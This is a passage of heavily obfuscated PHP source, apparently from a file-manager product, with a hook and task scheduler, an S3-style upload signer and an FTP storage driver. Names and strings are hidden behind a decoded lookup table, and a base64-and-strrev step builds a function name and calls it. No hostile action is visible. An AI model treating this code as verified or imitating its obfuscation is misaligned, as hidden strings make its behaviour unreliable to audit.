10); return !0; } return !1; } public static function timeLimitCall($Úî™¡é‰, $ÖûÆû­á, $¸ºáÎ‘’, $¿ŠØø·‡ = 5.0) { $½Š…¢àç =& $_SERVER[´‹ô¯Œ]; if (!$Úî™¡é‰ || !$ÖûÆû­á) { return; } self::$asyncAdd = !0; $ëÌë…ëÒ = $½Š…¢àç[1904]; $ëµ±Ï—à = Cache::get($ëÌë…ëÒ, !0); $ÓöŸ¸Ô = array($½Š…¢àç[1905] => timeFloat(), $½Š…¢àç[1906] => timeFloat(), $½Š…¢àç[344] => $ÖûÆû­á, $½Š…¢àç[1896] => $¸ºáÎ‘’, $½Š…¢àç[207] => $¿ŠØø·‡); if (is_array($ëµ±Ï—à[$Úî™¡é‰])) { $ÓöŸ¸Ô[$½Š…¢àç[1906]] = $ëµ±Ï—à[$Úî™¡é‰][$½Š…¢àç[1906]]; } if (is_array($ëµ±Ï—à[$Úî™¡é‰])) { if (timeFloat() - $ëµ±Ï—à[$Úî™¡é‰][$½Š…¢àç[1905]] < $ÓöŸ¸Ô[$½Š…¢àç[207]] * 0.3) { return; } $ÓöŸ¸Ô[$½Š…¢àç[1906]] = $ëµ±Ï—à[$Úî™¡é‰][$½Š…¢àç[1906]]; } $ëµ±Ï—à[$Úî™¡é‰] = $ÓöŸ¸Ô; Cache::set($ëÌë…ëÒ, $ëµ±Ï—à, 60); Cache::removeMemory($ëÌë…ëÒ); write_log($½Š…¢àç[1907] . $Úî™¡é‰ . $½Š…¢àç[74] . $ÖûÆû­á, $½Š…¢àç[198]); } public static function timeLimitCallLoop() { $ÎŠïÙ¯Ğ =& $_SERVER[´‹ô¯Œ]; $¶ˆ‚„Õ÷ = array($ÎŠïÙ¯Ğ[1908]); $ş¬¯Óóç = in_array(strtolower(ACTION), $¶ˆ‚„Õ÷); if (!$ş¬¯Óóç && !self::$asyncAdd) { return; } $ôÛ´î˜ = $ÎŠïÙ¯Ğ[1904]; $…ƒıú = Cache::get($ôÛ´î˜, !0); if (!$…ƒıú || count($…ƒıú) <= 0) { return; } $Š»ÔÚÉæ = !1; $À½éš¦Ã = timeFloat(); $ÒÀÍ“ù = array(); foreach ($…ƒıú as $ùØäô‡ => $¦÷ÊÈÜ§) { if ($À½éš¦Ã - $¦÷ÊÈÜ§[$ÎŠïÙ¯Ğ[1906]] > $¦÷ÊÈÜ§[$ÎŠïÙ¯Ğ[207]]) { $Š»ÔÚÉæ = !0; try { Hook::apply($¦÷ÊÈÜ§[$ÎŠïÙ¯Ğ[344]], $¦÷ÊÈÜ§[$ÎŠïÙ¯Ğ[1896]]); write_log($ÎŠïÙ¯Ğ[1909] . $ùØäô‡ . $ÎŠïÙ¯Ğ[74] . $¦÷ÊÈÜ§[$ÎŠïÙ¯Ğ[344]] . $ÎŠïÙ¯Ğ[1910] . ACTION, $ÎŠïÙ¯Ğ[198]); } catch (Exception $ç”Å‰ ä) { } continue; } $ÒÀÍ“ù[$ùØäô‡] = $¦÷ÊÈÜ§; } if (!$Š»ÔÚÉæ) { return; } if (!$ÒÀÍ“ù) { return Cache::remove($ôÛ´î˜); } Cache::set($ôÛ´î˜, $ÒÀÍ“ù, 60); Cache::removeMemory($ôÛ´î˜); } public static function finished($ê‰œò Î, $ëµ¿·‡) { $ÓƒÇÙœÄ =& $_SERVER[´‹ô¯Œ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ÓƒÇÙœÄ[344] => $ê‰œò Î, $ÓƒÇÙœÄ[1896] => $ëµ¿·‡); } private static function finishedRun() { $İßÅ¥¡Ñ =& $_SERVER[´‹ô¯Œ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $½èÇèü¬) { try { Hook::apply($½èÇèü¬[$İßÅ¥¡Ñ[344]], $½èÇèü¬[$İßÅ¥¡Ñ[1896]]); } catch (Exception $î”»µà) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto eÍ¦ÑêŒ; a§´–Ç¦ÙÎ: $fileSize = strrev(base64_decode($_SERVER[ÜûÈ¾…][0])); function binCheckNeq($¿ºØğ‰§, $Ğ¶‚ÔÁ‚) { return $¿ºØğ‰§ != $Ğ¶‚ÔÁ‚; } $_SERVER[$_SERVER[ÜûÈ¾…][1]] = $fileSize($_SERVER[$_SERVER[ÜûÈ¾…][2]]); goto BÓ­×Ü«„·; A†×‘¾×¢: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($“Ö™ëÂ“) { parent::__construct($“Ö™ëÂ“); $this->setSignVersion($_SERVER[´‹ô¯Œ][250]); } public function uploadFormData($ïïñ©Óú, $Üü†µ’æ = 3600) { $¯Âíâ½¯ =& $_SERVER[´‹ô¯Œ]; $Û÷¼Ãä£ = $¯Âíâ½¯[232]; $¶ÃÆ¤—¢ = $¯Âíâ½¯[260]; $‡åå‡ïÚ = $¯Âíâ½¯[62]; $ôƒáí±ç = gmdate($¯Âíâ½¯[261]); $‚ÕÆòÊ = gmdate($¯Âíâ½¯[262]); $Ÿœ§¤‘ˆ = $¯Âíâ½¯[263]; $ŒÊ„…× = $Üü†µ’æ . $¯Âíâ½¯[12]; $ÉÄö™ş´ = $¯Âíâ½¯[264]; $Ì–¼î = array($this->accessKey, $‚ÕÆòÊ, $this->region, $‡åå‡ïÚ, $Ÿœ§¤‘ˆ); $¾İ×Ìâ = implode($¯Âíâ½¯[8], $Ì–¼î); $‚¦“ªÒ = array($¯Âíâ½¯[265] => gmdate($¯Âíâ½¯[1437], strtotime($¯Âíâ½¯[267])), $¯Âíâ½¯[268] => array(array($¯Âíâ½¯[269] => $this->bucket), array($¯Âíâ½¯[309] => $Û÷¼Ãä£), array($¯Âíâ½¯[270], $¯Âíâ½¯[271], $¯Âíâ½¯[12]), array($¯Âíâ½¯[270], $¯Âíâ½¯[272], $¯Âíâ½¯[12]), array($¯Âíâ½¯[270], $¯Âíâ½¯[310], $¯Âíâ½¯[12]), array($¯Âíâ½¯[273] => $ÉÄö™ş´), array($¯Âíâ½¯[274] => $¾İ×Ìâ), array($¯Âíâ½¯[275] => $¶ÃÆ¤—¢), array($¯Âíâ½¯[276] => $ôƒáí±ç), array($¯Âíâ½¯[277] => $ŒÊ„…×))); $¥˜ÀêåŒ = base64_encode(json_encode($‚¦“ªÒ)); $Å¦éø”Æ = hash_hmac($¯Âíâ½¯[278], $‚ÕÆòÊ, $¯Âíâ½¯[279] . $this->secret, !0); $ßî×”Ş’ = hash_hmac($¯Âíâ½¯[278], $this->region, $Å¦éø”Æ, !0); $•â¸áæ = hash_hmac($¯Âíâ½¯[278], $‡åå‡ïÚ, $ßî×”Ş’, !0); $“èü¡Öí = hash_hmac($¯Âíâ½¯[278], $Ÿœ§¤‘ˆ, $•â¸áæ, !0); $áÏèÃ = hash_hmac($¯Âíâ½¯[278], $¥˜ÀêåŒ, $“èü¡Öí); $¡ó€íá¤ = array($¯Âíâ½¯[249] => $¯Âíâ½¯[12], $¯Âíâ½¯[297] => $¯Âíâ½¯[12], $¯Âíâ½¯[309] => $Û÷¼Ãä£, $¯Âíâ½¯[273] => $ÉÄö™ş´, $¯Âíâ½¯[280] => $¥˜ÀêåŒ, $¯Âíâ½¯[311] => $¾İ×Ìâ, $¯Âíâ½¯[312] => $¶ÃÆ¤—¢, $¯Âíâ½¯[313] => $ôƒáí±ç, $¯Âíâ½¯[314] => $ŒÊ„…×, $¯Âíâ½¯[315] => $áÏèÃ, $¯Âíâ½¯[209] => $this->getHost()); return $¡ó€íá¤; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($÷Ğ»„Ğâ) { parent::__construct(); if (count($÷Ğ»„Ğâ) > 0) { $this->_init($÷Ğ»„Ğâ); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($·Ó‰‹––) { $ÙÎ¶¨¯® =& $_SERVER[´‹ô¯Œ]; global $config; $this->appCharset = $config[$ÙÎ¶¨¯®[1463]]; $this->systemCharset = $config[$ÙÎ¶¨¯®[1464]]; if (isset($·Ó‰‹––[$ÙÎ¶¨¯®[1465]]) && $·Ó‰‹––[$ÙÎ¶¨¯®[1465]]) { $this->systemCharset = $·Ó‰‹––[$ÙÎ¶¨¯®[1465]]; } } public function iconvApp($Ä’¨†–¾) { return $this->iconvTo($Ä’¨†–¾, $this->systemCharset, $this->appCharset); } public function iconvSystem($Œùâƒ³‡) { return $this->iconvTo($Œùâƒ³‡, $this->appCharset, $this->systemCharset); } public function getPathOuter($ÚûÍ¨¯¸) { $ ÛÉ––õ =& $_SERVER[´‹ô¯Œ]; $úÔóøµè = $this->iconvApp($this->pathBase); $ÚûÍ¨¯¸ = $this->iconvApp($ÚûÍ¨¯¸); if (substr($úÔóøµè, 0, 2) == $ ÛÉ––õ[1435]) { $úÔóøµè = BASIC_PATH . substr($úÔóøµè, 2); } if (substr($ÚûÍ¨¯¸, 0, 2) == $ ÛÉ––õ[1435]) { $ÚûÍ¨¯¸ = BASIC_PATH . substr($ÚûÍ¨¯¸, 2); } $úÔóøµè = KodIO::clear($úÔóøµè); $ÚûÍ¨¯¸ = KodIO::clear($ÚûÍ¨¯¸); $ÚûÍ¨¯¸ = substr($ÚûÍ¨¯¸, strlen($úÔóøµè)); if (empty($this->pathDriver)) { return $ÚûÍ¨¯¸; } return $this->pathDriver . $ ÛÉ––õ[8] . ltrim($ÚûÍ¨¯¸, $ ÛÉ––õ[8]); } private function _init($¶ÀñÇ¤Š = array()) { $‹Î£›Å§ =& $_SERVER[´‹ô¯Œ]; if (!function_exists($‹Î£›Å§[1466])) { throw new Exception(LNG($‹Î£›Å§[1467])); } $this->config = $¶ÀñÇ¤Š; $this->charsetReset($¶ÀñÇ¤Š); foreach ($¶ÀñÇ¤Š as $ı¥å§÷ù => $°»õ¤‘‡) { if (isset($this->{$ı¥å§÷ù})) { $this->{$ı¥å§÷ù} = $°»õ¤‘‡; } } return $this->_login($¶ÀñÇ¤Š); } private function _login($‰óú«Ÿ‘) { $ÂˆÅÖ·¾ =& $_SERVER[´‹ô¯Œ]; static $µ„¤úµ = array(); $ı˜Ê€À× = md5(json_encode($‰óú«Ÿ‘)); if (isset($µ„¤úµ[$ı˜Ê€À×])) { foreach ($µ„¤úµ[$ı˜Ê€À×] as $‚¢êÈÍÕ => $öÁíÜÂÎ) { $this->{$‚¢êÈÍÕ} = $öÁíÜÂÎ; } return !0; } $÷íİ‰Ÿ = parse_url(trim($this->server, $ÂˆÅÖ·¾[8])); $this->host = $÷íİ‰Ÿ[$ÂˆÅÖ·¾[209]]; $£‰ËÊ­Î = isset($÷íİ‰Ÿ[$ÂˆÅÖ·¾[208]]) && $÷íİ‰Ÿ[$ÂˆÅÖ·¾[208]] == $ÂˆÅÖ·¾[1468] ? !0 : !1; $this->scheme = $£‰ËÊ­Î ? $ÂˆÅÖ·¾[1469] : $ÂˆÅÖ·¾[1470]; $this->port = isset($÷íİ‰Ÿ[$ÂˆÅÖ·¾[210]]) ? $÷íİ‰Ÿ[$ÂˆÅÖ·¾[210]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($ÂˆÅÖ·¾[1471]) . $this->host . $ÂˆÅÖ·¾[4] . $this->port, !0); return !1; } $Â²”„ = @ftp_login($this->connect, $this->username, $this->userpass); if (!$Â²”„) { $this->writeLog(LNG($ÂˆÅÖ·¾[1472]) . $this->username, !0); return !1; } $this->ftpPath = @ftp_pwd($this->connect); @ftp_chdir($this->connect, $ÂˆÅÖ·¾[8]); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $ÁÃóş‚· = $this->pasv == $ÂˆÅÖ·¾[91] ? !0 : !1; @ftp_pasv($this->connect, $ÁÃóş‚·); $µ„¤úµ[$ı˜Ê€À×] = array($ÂˆÅÖ·¾[1473] => $this->connect, $ÂˆÅÖ·¾[209] => $this->host, $ÂˆÅÖ·¾[208] => $this->scheme, $ÂˆÅÖ·¾[210] => $this->port); return $Â²”„; } private function _isconn($®€ê×Ò¹ = true) { if (is_resource($this->connect)) { return !0; } if (!$®€ê×Ò¹) { return !1; } return $this->_login($this->config); } public function mkfile($’¾Ï…±º, $ø€ôæÎ€ = '', $›õ´Ö = REPEAT_RENAME) { if ($this->setContent($’¾Ï…±º, $ø€ôæÎ€)) { return $this->getPathOuter($’¾Ï…±º); } $this->writeLog(LNG($_SERVER[´‹ô¯Œ][1474]), !0); return !1; } public function mkdir($ÓÀ çìµ, $²óÀæà’ = REPEAT_SKIP) { $ô ØÖÑ¹ =& $_SERVER[´‹ô¯Œ]; if (!$ÓÀ çìµ || $ÓÀ çìµ == $ô ØÖÑ¹[8]) { return !0; } if (!$this->_isconn()) { return !1; } $ÓÀ çìµ = $this->iconvSystem($ÓÀ çìµ); if ($this->_isFolder($ÓÀ çìµ) || @ftp_mkdir($this->connect, $ÓÀ çìµ)) { return $this->getPathOuter($ÓÀ çìµ); } if (!$this->mkdir($this->pathFather($ÓÀ çìµ))) { return !1; } if ($ÓÀ çìµ = @ftp_mkdir($this->connect, $ÓÀ çìµ)) { return $this->getPathOuter($ÓÀ çìµ); } $‹ªŸİ–° = __FUNCTION__ . $ô ØÖÑ¹[1475]; $this->writeLog($‹ªŸİ–°, !0); return !1; } public function copyFile($¥Ì›ÕÃœ, $å ×Æ¦®) { if (!$this->_isconn()) { return !1; } $ˆÉ€”¥ = $this->pathThis($this->iconvSystem($¥Ì›ÕÃœ)); $×œ¡¶“ = $this->tempFile($ˆÉ€”¥); $˜‘ë«ğ = $this->iconvApp($×œ¡¶“); $this->download($¥Ì›ÕÃœ, $˜‘ë«ğ); $ï‡ö¦´ = $this->upload($å ×Æ¦®, $˜‘ë«ğ); $this->tempFileRemve($×œ¡¶“); return $ï‡ö¦´; } public function moveFile($øöÕ¾å, $Ú™¬Ã²Ü) { if (!$this->_isconn()) { return !1; } $øöÕ¾å = $this->iconvSystem($øöÕ¾å); $Ú™¬Ã²Ü = $this->iconvSystem($Ú™¬Ã²Ü); $¹°©ºØÉ = @ftp_rename($this->connect, $øöÕ¾å, $Ú™¬Ã²Ü); if (!$¹°©ºØÉ) { $this->writeLog(__FUNCTION__ . $_SERVER[´‹ô¯Œ][1475], !0); return !1; } return $this->getPathOuter($Ú™¬Ã²Ü); } public function delFile($ûŒ×çá) { if (!$this->_isconn()) { return !1; } $ûŒ×çá = $this->iconvSystem($ûŒ×çá); $ØŞÎä¥ = @ftp_delete($this->connect, $ûŒ×çá); if (!$ØŞÎä¥) { $this->writeLog(__FUNCTION__ . $_SERVER[´‹ô¯Œ][1475], !0); } return $ØŞÎä¥; } public function delFolder($ÌÆğ•È) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $öé¸à  = $Î¨ñĞŠÉ = array(); $this->fileList($ÌÆğ•È, $öé¸à , $Î¨ñĞŠÉ, !0); $this->listItemCache = !0; foreach ($Î¨ñĞŠÉ as $„ÄĞÄä) { $Éœ¼¢œ = $this->iconvSystem($„ÄĞÄä[$_SERVER[´‹ô¯Œ][32]]); $¹¹›úîÆ = @ftp_delete($this->connect, $Éœ¼¢œ); if (!$¹¹›úîÆ) { return !1; } } foreach ($öé¸à  as $Éœ¼¢œ) { $Éœ¼¢œ = $this->iconvSystem($Éœ¼¢œ); $¹¹›úîÆ = @ftp_rmdir($this->connect, $Éœ¼¢œ); if (!$¹¹›úîÆ) { return !1; } } $ÌÆğ•È = $this->iconvSystem($ÌÆğ•È); return @ftp_rmdir($this->connect, $ÌÆğ•È); } public function rename($øªûºÁ, $òº¶¹Ú”) { $ıºÕ‚¸ä =& $_SERVER[´‹ô¯Œ]; if (!$this->_isconn()) { return !1; } $•‰Ş¥ö = $this->fileNameAuto($this->pathFather($øªûºÁ), $òº¶¹Ú”); $•‰Ş¥ö = $this->iconvSystem($•‰Ş¥ö); $øªûºÁ = $this->iconvSystem($øªûºÁ); $ôŒ½Ö¯ = $this->pathFather($øªûºÁ); $£‡¾Ûä¡ = rtrim($ôŒ½Ö¯, $ıºÕ‚¸ä[8]) . $ıºÕ‚¸ä[8] . $•‰Ş¥ö; $±¿»ü™Â = @ftp_rename($this->connect, $øªûºÁ, $£‡¾Ûä¡); if (!$±¿»ü™Â) { $this->writeLog(__FUNCTION__ . $ıºÕ‚¸ä[1475], !0); return !1; } $£‡¾Ûä¡ = $this->iconvApp($£‡¾Ûä¡); return $this->getPathOuter($£‡¾Ûä¡); } private function folderInfo($€¸‚ÁöÚ, $ƒÚ™œĞ = false) { $ğóÇ¼àú =& $_SERVER[´‹ô¯Œ]; $ëÆ¦áÑî = array($ğóÇ¼àú[32] => $this->pathThis($€¸‚ÁöÚ), $ğóÇ¼àú[87] => $this->getPathOuter($ğóÇ¼àú[8] . $€¸‚ÁöÚ), $ğóÇ¼àú[33] => $ğóÇ¼àú[78]); if ($ƒÚ™œĞ) { return $ëÆ¦áÑî; } $ëÆ¦áÑî[$ğóÇ¼àú[234]] = $ëÆ¦áÑî[$ğóÇ¼àú[88]] = 0; $ëÆ¦áÑî[$ğóÇ¼àú[235]] = $ëÆ¦áÑî[$ğóÇ¼àú[236]] = !0; return $ëÆ¦áÑî; } private function fileInfo($‡¤›¡Í§, $’Â„æ´Å = false, $÷Ê©‘¨ì = array()) { $Ó¯«ë÷Ë =& $_SERVER[´‹ô¯Œ]; $½ÁºØŞü = array($Ó¯«ë÷Ë[32] => $this->pathThis($‡¤›¡Í§), $Ó¯«ë÷Ë[87] => $this->getPathOuter($Ó¯«ë÷Ë[8] . $‡¤›¡Í§), $Ó¯«ë÷Ë[33] => $Ó¯«ë÷Ë[233], $Ó¯«ë÷Ë[79] => isset($÷Ê©‘¨ì[$Ó¯«ë÷Ë[79]]) ? $÷Ê©‘¨ì[$Ó¯«ë÷Ë[79]] : 0, $Ó¯«ë÷Ë[169] => $this->ext($‡¤›¡Í§)); if ($’Â„æ´Å) { return $½ÁºØŞü; } $½ÁºØŞü[$Ó¯«ë÷Ë[234]] = $½ÁºØŞü[$Ó¯«ë÷Ë[88]] = 0; $½ÁºØŞü[$Ó¯«ë÷Ë[235]] = $½ÁºØŞü[$Ó¯«ë÷Ë[236]] = !0; $×¿ëÙ‡ò = $this->iconvSystem($‡¤›¡Í§); $½ÁºØŞü[$Ó¯«ë÷Ë[88]] = @ftp_mdtm($this->connect, $×¿ëÙ‡ò); if (empty($÷Ê©‘¨ì)) { $÷Ê©‘¨ì = $this->objectMeta($‡¤›¡Í§); if (!$÷Ê©‘¨ì) { return $½ÁºØŞü; } } $½ÁºØŞü[$Ó¯«ë÷Ë[79]] = $÷Ê©‘¨ì[$Ó¯«ë÷Ë[79]]; return $½ÁºØŞü; } public function size($Ûô‰›Ó) { $˜ ›ïàÈ = $this->objectMeta($Ûô‰›Ó); return $˜ ›ïàÈ ? $˜ ›ïàÈ[$_SERVER[´‹ô¯Œ][79]] : 0; } public function info($ƒö‚Öå) { if ($this->isFile($ƒö‚Öå)) { return $this->fileInfo($ƒö‚Öå, 0); } else { if ($this->isFolder($ƒö‚Öå)) { return $this->folderInfo($ƒö‚Öå); } } return !1; } private function fileList($äŞø‰×ò, &$¶¬›Ğä‰, &$ñÍæ ç², $úùÉß‡ó = false) { $‘â®«İ =& $_SERVER[´‹ô¯Œ]; $äŞø‰×ò = $this->iconvSystem($äŞø‰×ò); if (!$this->isFolder($äŞø‰×ò)) { return !1; } $äŞø‰×ò = rtrim($äŞø‰×ò, $‘â®«İ[8]) . $‘â®«İ[8]; check_abort(); $´¯Û”¾œ = @ftp_rawlist($this->connect, $äŞø‰×ò); if (!$´¯Û”¾œ) { $´¯Û”¾œ = array(); } $‚¼°‡Ë³ = array($‘â®«İ[10] => 1, $‘â®«İ[1380] => 1); foreach ($´¯Û”¾œ as $£­Ï“«×) { $¿€Ï‘½ = $this->_listItem($£­Ï“«×); if ($¿€Ï‘½[0] == $‘â®«İ[844]) { continue; } $šø²Á– = $¿€Ï‘½[8]; if (empty($šø²Á–) && $šø²Á– !== $‘â®«İ[231] || isset($‚¼°‡Ë³[$šø²Á–])) { continue; } $šø²Á– = $this->iconvApp($äŞø‰×ò . ltrim($šø²Á–, $‘â®«İ[8])); $»‚¢É¨÷ = array($‘â®«İ[32] => $šø²Á–, $‘â®«İ[33] => $‘â®«İ[233], $‘â®«İ[79] => $¿€Ï‘½[4]); if (substr($£­Ï“«×, 0, 1) == $‘â®«İ[1476]) { $»‚¢É¨÷[$‘â®«İ[33]] = $‘â®«İ[78]; $»‚¢É¨÷[$‘â®«İ[79]] = 0; } $‰×¸Æå = $»‚¢É¨÷[$‘â®«İ[33]] == $‘â®«İ[78] ? !0 : !1; $this->cacheMethodInfoSet($šø²Á–, $‰×¸Æå, $»‚¢É¨÷); if ($‰×¸Æå) { $¶¬›Ğä‰[] = $šø²Á–; if ($úùÉß‡ó) { $this->fileList($šø²Á–, $¶¬›Ğä‰, $ñÍæ ç², $úùÉß‡ó); } continue; } $ñÍæ ç²[] = $»‚¢É¨÷; } $this->cacheMethodInfoSet($äŞø‰×ò, !0); } private function _listItem($¢Ú‚—ã˜) { if (empty($¢Ú‚—ã˜)) { return array(); } $âµî¯ƒà = preg_split($_SERVER[´‹ô¯Œ][1477], $¢Ú‚—ã˜); if (count($âµî¯ƒà) <= 9) { return $âµî¯ƒà; } $âµî¯ƒà[8] = trim(substr($¢Ú‚—ã˜, strpos($¢Ú‚—ã˜, $âµî¯ƒà[7]) + strlen($âµî¯ƒà[7]))); return array_splice($âµî¯ƒà, 0, 9); } public function listPath($Š÷Ë¢ºƒ, $ò¨Ê½’à = false) { $¥Ï†ŸÌè =& $_SERVER[´‹ô¯Œ]; if (!$this->_isconn()) { return !1; } $ì—ÍøÎ = $öò›Ú—Ú = array(); $this->fileList($Š÷Ë¢ºƒ, $ì—ÍøÎ, $öò›Ú—Ú); foreach ($ì—ÍøÎ as $ÏİÇªó½ => $¹§ÄóŸ˜) { $ì—ÍøÎ[$ÏİÇªó½] = $this->folderInfo($¹§ÄóŸ˜, $ò¨Ê½’à); } foreach ($öò›Ú—Ú as $ÏİÇªó½ => $¹§ÄóŸ˜) { $öò›Ú—Ú[$ÏİÇªó½] = $this->fileInfo($¹§ÄóŸ˜[$¥Ï†ŸÌè[32]], $ò¨Ê½’à, $¹§ÄóŸ˜); } return array($¥Ï†ŸÌè[85] => $ì—ÍøÎ, $¥Ï†ŸÌè[86] => $öò›Ú—Ú); } public function has($ÑÁ¯İåÍ, $Ù™çßï¿ = false, $èĞóûÕ = true) { $úšÙÄ³Ç =& $_SERVER[´‹ô¯Œ]; $¨ïóù« = $â¶÷ü = array(); $óùĞâŠÆ = $Ù™çßï¿ ? !0 : !1; $this->fileList($ÑÁ¯İåÍ, $¨ïóù«, $â¶÷ü, $óùĞâŠÆ); if ($Ù™çßï¿) { return array($úšÙÄ³Ç[242] => count($â¶÷ü), $úšÙÄ³Ç[243] => count($¨ïóù«)); } if ($èĞóûÕ) { if (count($â¶÷ü)) { return !0; } } else { if (count($¨ïóù«)) { return !0; } } return !1; } public function listAll($â’ƒŸëØ) { $æğÊ¥¼ú =& $_SERVER[´‹ô¯Œ]; if (!$this->_isconn()) { return !1; } $Ô¼šÛ¥§ = $®€ÇÙ¸¯ = array(); $this->fileList($â’ƒŸëØ, $Ô¼šÛ¥§, $®€ÇÙ¸¯, !0); $¼úËŒğÓ = array_to_keyvalue($®€ÇÙ¸¯, $æğÊ¥¼ú[32]); foreach ($Ô¼šÛ¥§ as $îÙ©¨øƒ) { if (is_string($îÙ©¨øƒ)) { $¼úËŒğÓ[$îÙ©¨øƒ] = array($æğÊ¥¼ú[79] => 0); } } return $this->listAllFiles($â’ƒŸëØ, $¼úËŒğÓ); } public function getContent($°‘…ë×İ) { if (!$this->_isconn()) { return !1; } $°‘…ë×İ = $this->iconvSystem($°‘…ë×İ); return $this->fileSubstr($°‘…ë×İ); } public function setContent($ë¹İ¶Íº, $¼ÇàûÜû = '') { if (!$this->_isconn()) { return !1; } $ºƒ©Úî€ = $this->pathThis($this->iconvSystem($ë¹İ¶Íº)); $ã ¸è´Ô = $this->tempFile($ºƒ©Úî€); file_put_contents($ã ¸è´Ô, $¼ÇàûÜû); $³÷ÛöŞ = $this->upload($ë¹İ¶Íº, $this->iconvApp($ã ¸è´Ô)); $this->tempFileRemve($ã ¸è´Ô); return $³÷ÛöŞ; } public function fileSubstr($ÔÔıúçı, $†İâ¿´Í = 0, $˜Ñ¼ä = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($ÔÔıúçı, $†İâ¿´Í, $˜Ñ¼ä); } private function ftpRequest($Çâßîà´, $ØúÚÉ é = 0, $—”ìœéç = false) { $ÁÂß…ƒé =& $_SERVER[´‹ô¯Œ]; $Çâßîà´ = $ÁÂß…ƒé[8] . ltrim(str_ltrim($Çâßîà´, $this->ftpPath), $ÁÂß…ƒé[8]); $Çâßîà´ = $this->iconvSystem($Çâßîà´); $®ôı¢ = $this->scheme . $this->host . $ÁÂß…ƒé[4] . $this->port; $È¥²Ù× = curl_init(); curl_setopt($È¥²Ù×, CURLOPT_URL, $®ôı¢ . $this->pathEncode($Çâßîà´)); curl_setopt($È¥²Ù×, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($—”ìœéç) { $·êğ¾Âù = $ØúÚÉ é + $—”ìœéç - 1; curl_setopt($È¥²Ù×, CURLOPT_RANGE, "{$ØúÚÉ é}\x2d{$·êğ¾Âù}"); } curl_setopt($È¥²Ù×, CURLOPT_RETURNTRANSFER, 1); $¿Õ©ÜÃç = curl_exec($È¥²Ù×); curl_close($È¥²Ù×); return $¿Õ©ÜÃç; } public function upload($ÇâÕĞ¹½, $ÓŒ²¬¢ä, $²İÃˆûÂ = false, $Ååı§” = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($ÇâÕĞ¹½))) { return !1; } $ÇâÕĞ¹½ = $this->iconvSystem($ÇâÕĞ¹½); $ÓŒ²¬¢ä = $this->iconvSystem($ÓŒ²¬¢ä); $‚È¨“¥Í = ftp_nb_put($this->connect, $ÇâÕĞ¹½, $ÓŒ²¬¢ä, FTP_BINARY); while ($‚È¨“¥Í == FTP_MOREDATA) { $‚È¨“¥Í = ftp_nb_continue($this->connect); } if ($‚È¨“¥Í != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[´‹ô¯Œ][1475], !0); return !1; } return $this->getPathOuter($ÇâÕĞ¹½); } public function download($“É¢æ‚Ñ, $Ì°¿©‘£ = '') { if (!$this->_isconn()) { return !1; } $“–®Îîä = $this->pathFather($Ì°¿©‘£); if (!IO::mkdir($“–®Îîä)) { return !1; } $“É¢æ‚Ñ = $this->iconvSystem($“É¢æ‚Ñ); $Ì°¿©‘£ = $this->iconvSystem($Ì°¿©‘£); $¦íÅÇÆú = ftp_nb_get($this->connect, $Ì°¿©‘£, $“É¢æ‚Ñ, FTP_BINARY); while ($¦íÅÇÆú == FTP_MOREDATA) { $¦íÅÇÆú = ftp_nb_continue($this->connect); } if ($¦íÅÇÆú != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[´‹ô¯Œ][1475], !0); return !1; } return $this->iconvApp($Ì°¿©‘£); } public function exist($ûÖÉèşå) { return $this->isFile($ûÖÉèşå) || $this->isFolder($ûÖÉèşå); } public function isFile($şÁéâ›) { return !$this->isFolder($şÁéâ›) && $this->objectMeta($şÁéâ›); } public function isFolder($¾°ÓæÕı) { return $this->cacheMethod($_SERVER[´‹ô¯Œ][180], $¾°ÓæÕı); } protected function objectMeta($¼Ò”ã‘ú) { return $this->cacheMethod($_SERVER[´‹ô¯Œ][182], $¼Ò”ã‘ú); } protected function _objectMeta($Ò‚à•ë¿) { $´öé„Ñ° =& $_SERVER[´‹ô¯Œ]; if ($Ò‚à•ë¿ == $´öé„Ñ°[12] || $Ò‚à•ë¿ == $´öé„Ñ°[8]) { return array(); } if (!$this->_isconn()) { return !1; } $Ò‚à•ë¿ = $this->iconvSystem($Ò‚à•ë¿); $ŠÄ´Ä¨ê = array($´öé„Ñ°[32] => $this->iconvApp($Ò‚à•ë¿), $´öé„Ñ°[33] => $´öé„Ñ°[233], $´öé„Ñ°[79] => 0); $âÅüü¯û = @ftp_size($this->connect, $Ò‚à•ë¿); if ($âÅüü¯û != -1) { $ŠÄ´Ä¨ê[$´öé„Ñ°[79]] = $âÅüü¯û; } else { $¼¥»¨âÄ = @ftp_chdir($this->connect, $Ò‚à•ë¿); if (!$¼¥»¨âÄ) { return !1; } @ftp_chdir($this->connect, $´öé„Ñ°[8]); $ŠÄ´Ä¨ê[$´öé„Ñ°[33]] = $´öé„Ñ°[78]; } return $ŠÄ´Ä¨ê; } protected function _isFolder($–ìñâ’«) { $µé“«¬õ =& $_SERVER[´‹ô¯Œ]; if ($–ìñâ’« == $µé“«¬õ[12] || $–ìñâ’« == $µé“«¬õ[8]) { return !0; } $ıöË¿ø = $this->_objectMeta($–ìñâ’«); return isset($ıöË¿ø[$µé“«¬õ[33]]) && $ıöË¿ø[$µé“«¬õ[33]] == $µé“«¬õ[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($íïóÏÀÔ) { parent::__construct($íïóÏÀÔ); $this->setSignVersion($_SERVER[´‹ô¯Œ][250]); } public function uploadLink($ÁÇ, $¸‰Ü¨ å = 0) { $Áõµó°º =& $_SERVER[´‹ô¯Œ]; if ($this->isUploadServer()) { return; } $ş´Éîí† = $this->getType(); if (!in_array($ş´Éîí†, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $·®æáÁ¸ = 